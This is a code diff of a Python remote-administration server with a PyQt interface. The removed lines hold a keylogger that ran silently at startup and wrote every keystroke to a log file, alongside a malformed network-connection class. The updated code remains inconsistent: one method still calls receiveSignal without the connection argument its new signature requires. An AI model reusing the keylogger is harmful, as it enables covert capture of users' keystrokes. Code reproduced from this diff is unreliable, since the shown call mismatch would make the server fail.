@@ -27,47 +27,12 @@ LOGOUT = "logout"
 EXIT = "exit"
 
 
-class KeyLogger:
-    @staticmethod
-    def startKLog():
-        # Implement your keylogging logic here
-        def on_key_release(key):
-            with open(AppStart.path, "a") as file:
-                file.write(str(key) + '\n')
-
-        with pynput.keyboard.Listener(on_key_release=on_key_release) as listener:
-            listener.join()
-
-
-class AppStart:
-    path = "logfile.txt"  # Update this with the appropriate file path
-
-
-class NetworkConnection:
-    def __init__(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect(HOST, PORT)
-        self.buffer = ""
-
-    def write(self, data):
-        self.buffer += data
-
-    def flush(self):
-        self.sock.sendall(self.buffer.encode('utf-8'))
-        self.buffer = ""
-
-    def receive(self, size):
-        return self.sock.recv(size).decode('utf-8')
-
-    def close(self):
-        self.sock.close()
-
-
 class Server:
     def __init__(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.clients = []
-        self.nw = NetworkConnection()
+        self.nw_lock = threading.Lock()
+        self.nr_lock = threading.Lock()
 
     def start(self):
         try:
@@ -258,7 +223,8 @@ class Server:
             return "Error: " + str(ex)
 
     def send_response(self, conn, response):
-        conn.sendall(bytes(response, "utf8"))
+        with self.nw_lock:
+            conn.sendall(bytes(response, "utf8"))
 
     def base_registry_key(self, link):
         base_key = None
@@ -340,19 +306,19 @@ class Server:
             elif s == "QUIT":
                 return
 
-    def receiveSignal(self):
+    def receiveSignal(self, conn):
         try:
-            # Assuming you send a 4-byte signal size first
-            signal_size = int(self.nw.receive(4))
-            signal_data = self.nw.receive(signal_size)
-            return signal_data.decode("utf-8")
+            with self.nr_lock:
+                signal_size = int(conn.recv(4).decode("utf-8"))
+                signal_data = conn.recv(signal_size).decode("utf-8")
+                return signal_data
         except Exception as e:
             print("Error receiving signal:", str(e))
             return ""
 
-    def application(self):
+    def application(self, conn):
         while True:
-            ss = self.receiveSignal()
+            ss = self.receiveSignal(conn)
             if ss == "XEM":
                 pr = psutil.process_iter(
                     ['pid', 'name', 'num_threads', 'num_handles', 'memory_info'])
@@ -455,17 +421,17 @@ class Server:
                         break
 
     def button1_Click(self):
-        ip = "0.0.0.0"
-        port = 5656
-
+        ip = 'localhost'
+        port = PORT
         with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as server:
             server.bind((ip, port))
             server.listen(100)
 
             client, _ = server.accept()
             ns = client.makefile('rwb')
-            self.nr = ns
-            self.nw = ns
+            with self.nw_lock, self.nr_lock:
+                self.nr = ns
+                self.nw = ns
 
             while True:
                 s = self.receiveSignal()
@@ -509,20 +475,14 @@ class ServerGUI(QWidget):
 
 
 def main():
-    
-    keylogger = KeyLogger()
-    threading.Thread(target=keylogger.startKLog).start()
-    
-    app_start = AppStart()
-    
     server = Server()
     threading.Thread(target=server.start).start()
 
-    app = QApplication(sys.argv)
+    app = QApplication(sys.argv)  # Initialize PyQt6 app here
     server_app = ServerGUI(server)
     server_app.show()
     sys.exit(app.exec_())
 
-
 if __name__ == "__main__":
     main()
+
